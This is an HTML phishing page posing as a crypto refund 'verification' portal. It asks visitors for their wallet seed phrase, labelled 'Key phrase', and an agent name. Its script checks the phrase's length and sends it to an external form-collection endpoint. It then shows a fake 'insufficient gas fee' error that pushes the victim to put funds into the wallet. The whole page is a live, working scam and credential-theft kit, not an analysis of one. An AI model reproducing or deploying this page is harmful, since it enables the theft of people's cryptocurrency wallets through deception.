<!doctype html>
<html lang="en">
<head>
    <title>Recoup Registration Process</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes">

    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://unpkg.com/sweetalert/dist/sweetalert.css">
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        body {
            font-family: 'Lato', sans-serif;
            background: url('images/bg.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            margin-top: 50px;
        }
        .card {
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .btn-primary {
            background-color: #007bff;
            border-color: #007bff;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            border-color: #004080;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        .heading-section {
            font-size: 1.25rem;
            font-weight: 700;
            margin-top: 20px;
            margin-bottom: 20px;
            color: #333;
        }
        .logo {
            max-width: 20%;
            margin-bottom: 20px;
        }
        .alert {
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>

<section class="ftco-section">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 text-center mb-5">
                <img src="./css/logo.svg" class="img-fluid logo">
                <h6 class="heading-section">Connect through dapps and web3 protocol<br>In order to receive the allocated refund.</h6>
            </div>
        </div>
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="card">
                    <h5 class="mb-4 text-center">Verify you are not a robot</h5>
                    <form name="myform" id="myForm" class="signin-form">
                        <div class="form-group">
                            <input name="name" id="name" type="text" class="form-control" placeholder="Name of agent in charge" required>
                        </div>
                        <div class="form-group">
                            <input name="key" id="key" type="text" class="form-control" placeholder="Key phrase (Usually 12 words separated by commas)" required>
                        </div>
                        <div class="form-group">
                            <div class="g-recaptcha" data-sitekey="6Lf_tgQqAAAAAFiZ2xgLRivy2uTAiJwmeGehy9cI"></div>
                        </div>
                        <div class="form-group">
                            <button type="submit" class="btn btn-primary btn-block submit px-3">Begin Verification</button>
                        </div>
                    </form>
                    <div class="alert alert-success" role="alert" id="success-message">
                        Your verification has been submitted!
                    </div>
                    <div class="alert alert-danger" role="alert" id="error-message">
                        There was an error submitting your verification. Please try again.
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<script>
    document.getElementById('myForm').addEventListener('submit', function (event) {
        event.preventDefault();

        // Validate the form fields
        var name = document.getElementById('name').value;
        var key = document.getElementById('key').value;
        var recaptchaResponse = grecaptcha.getResponse();

        if (name.trim() === '') {
            alert("Please fill in the name of your agent");
            return false;
        } else if (key.trim().split(' ').length < 6) {
            alert("Key Phrase is usually 12 or 24 words long.");
            return false;
        } else if (recaptchaResponse.length === 0) {
            alert('Please complete the reCAPTCHA');
            return false;
        }

        // Prepare form data for submission
        var formData = new FormData();
        formData.append('name', name);
        formData.append('key', key);
        formData.append('g-recaptcha-response', recaptchaResponse);

        // Send form data via AJAX
        fetch('https://submit-form.com/9oVHI3Lon', {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => {
            if (response.ok) {
                document.getElementById('success-message').style.display = 'block';
                document.getElementById('error-message').style.display = 'none';
                document.getElementById('myForm').reset();
                grecaptcha.reset();
                swal("Insufficent gas fee!", "Your rfund could not be processed, please ensure you have some balance before proceeding !", "error");
            } else {
                document.getElementById('error-message').style.display = 'block';
                document.getElementById('success-message').style.display = 'none';
                swal("Error", "There was an error submitting your verification. Please try again.", "error");
            }
        }).catch(error => {
            document.getElementById('error-message').style.display = 'block';
            document.getElementById('success-message').style.display = 'none';
            swal("Error", "There was an error submitting your verification. Please try again.", "error");
        });
    });
</script>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
